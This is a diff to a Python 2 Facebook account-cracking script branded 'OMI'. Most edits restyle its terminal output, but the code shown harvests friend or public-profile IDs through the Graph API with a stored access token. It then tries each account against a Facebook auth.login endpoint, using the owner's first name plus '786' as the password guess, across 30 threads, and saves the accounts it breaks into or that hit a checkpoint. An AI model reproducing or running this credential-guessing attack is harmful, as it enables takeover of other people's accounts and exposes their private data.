@@ -67,7 +67,7 @@ logo = """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m✰ \x1b[1;93mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m❥ \x1b[1;93mLoading \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -105,10 +105,10 @@ while (loop == 'true'):
             print "Logged in successfully as " + username
             loop = 'false'
         else:
-            print "Wrong Password"
+            print "\033[1;91mWrong Password"
             os.system('xdg-open https://www.Facebook.com/Omi6t')
     else:
-        print "Wrong Username"
+        print "\033[1;91mWrong Username"
         os.system('xdg-open https://www.Facebook.com/Omi6t')
 
 def login():
@@ -127,7 +127,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;91m☠ \x1b[1;91mThere is no internet connection"
+			print"\n\033[1;91m✘ \x1b[1;91mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -195,9 +195,9 @@ def menu():
 	os.system("clear")
 	print logo
 	print "\033[1;96m«--------------------✧--------------------»"
-	print "\033[1;96m[\033[1;97mâœ“\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97mâœ“\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
+	print "\033[1;96m[\033[1;97👤\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m[\033[1;97👤\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print "\033[1;96m«--------------------✧--------------------»"
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking With OMI"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
@@ -206,7 +206,7 @@ def menu():
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if unikers =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		print "\033[1;96m✘\x1b[1;91mFill in correctly"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -215,7 +215,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		print "\033[1;96m✘\x1b[1;91mFill in correctly"
 		pilih()
 
 
@@ -225,13 +225,13 @@ def super():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		print"\033[1;96m✘\x1b[1;91mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	os.system('clear')
 	print logo
-	print 42*"\033[1;96m="
+	print "\033[1;96m«--------------------✧--------------------»"
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
@@ -246,8 +246,8 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
-		jalan('\033[1;96m[âœº] \033[1;93mGetting ID \033[1;97m...')
+		print "\033[1;96m«--------------------✧--------------------»"
+		jalan('\033[1;96m👤\033[1;93mGetting ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -255,17 +255,17 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
+		print "\033[1;96m=«--------------------✧--------------------»"
+		idt = raw_input("\033[1;96m👤\033[1;93mEnter ID \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97mâœ“\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
+			print"\033[1;96m[\033[1;97m👤\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
+			print"\033[1;96m✘\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m[âœº] \033[1;93mGetting IDs \033[1;97m...')
+		jalan('\033[1;96m👤\033[1;93mGetting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -273,29 +273,29 @@ def pilih_super():
 	elif peak =="3":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print "\033[1;96m«--------------------✧--------------------»"
 		try:
 			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except IOError:
-			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
+			print '\x1b[1;96m✘\x1b[1;91mFile Not Found'
 			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
 			super()
 	elif peak =="0":
 		menu()
 	else:
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		print "\033[1;96m✘\x1b[1;91mFill in correctly"
 		pilih_super()
 	
-	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[âœº] \033[1;93mStarting \033[1;97m...')
+	print "\033[1;96m👤\033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
+	jalan('\033[1;96m👤\033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97mâœ¸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m👤\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
-	print 42*"\033[1;96m="
+	print('\x1b[1;96m✘\x1b[1;93mTo Stop Process Press CTRL Then Press Z')
+	print "\033[1;96m«--------------------✧--------------------»"
 	
 			
 	def main(arg):
@@ -394,7 +394,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + '1122'
+															pass7 = b['first_name'] + '786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -414,8 +414,8 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97mâœ“\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
+	print "\033[1;96m«--------------------✧--------------------»"
+	print '\033[1;96m[\033[1;97m👤\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
